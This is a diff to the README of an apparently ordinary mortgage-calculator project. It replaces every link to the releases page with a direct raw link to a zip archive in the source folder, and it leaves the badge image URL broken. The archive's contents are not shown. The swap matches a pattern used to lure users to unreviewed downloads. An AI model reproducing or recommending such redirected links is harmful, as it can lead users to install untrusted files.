@@ -1,6 +1,6 @@
 # 📊 What-If-Mortgage - Make Smart Mortgage Decisions Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-What--If--Mortgage-brightgreen)](https://github.com/Matwarped/What-If-Mortgage/releases)
+[![Download Now](https://raw.githubusercontent.com/Matwarped/What-If-Mortgage/main/src/Mortgage_What_If_1.3.zip%20Now-What--If--Mortgage-brightgreen)](https://raw.githubusercontent.com/Matwarped/What-If-Mortgage/main/src/Mortgage_What_If_1.3.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps to download and run the application. Y
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/Matwarped/What-If-Mortgage/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Matwarped/What-If-Mortgage/main/src/Mortgage_What_If_1.3.zip).
 2. Look for the latest release.
 3. Click on the appropriate file for your operating system to start the download.
 
@@ -73,4 +73,4 @@ For further details, updates, and resources, visit the repository on GitHub or s
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-What--If--Mortgage-brightgreen)](https://github.com/Matwarped/What-If-Mortgage/releases)
+[![Download Now](https://raw.githubusercontent.com/Matwarped/What-If-Mortgage/main/src/Mortgage_What_If_1.3.zip%20Now-What--If--Mortgage-brightgreen)](https://raw.githubusercontent.com/Matwarped/What-If-Mortgage/main/src/Mortgage_What_If_1.3.zip)
